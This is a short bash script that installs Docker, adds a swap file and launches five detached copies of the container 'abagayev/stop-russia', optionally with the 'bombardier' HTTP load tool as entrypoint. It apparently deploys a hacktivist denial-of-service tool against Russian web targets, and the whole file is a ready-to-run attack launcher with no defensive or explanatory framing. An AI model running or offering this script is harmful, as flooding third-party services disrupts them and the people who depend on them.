#!/bin/bash

apt -y update
apt -y install docker.io

fallocate -l 1G /swapfile && chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile 

NUMPROC=5
COMMAND=""
ENTRYPOINT=""

if [ ! -z "$COMMAND" ]; then
  ENTRYPOINT="--entrypoint bombardier"
fi

for proc in $(seq 1 $NUMPROC); do
  screen -d -m docker run -ti --rm $ENTRYPOINT abagayev/stop-russia $COMMAND
done
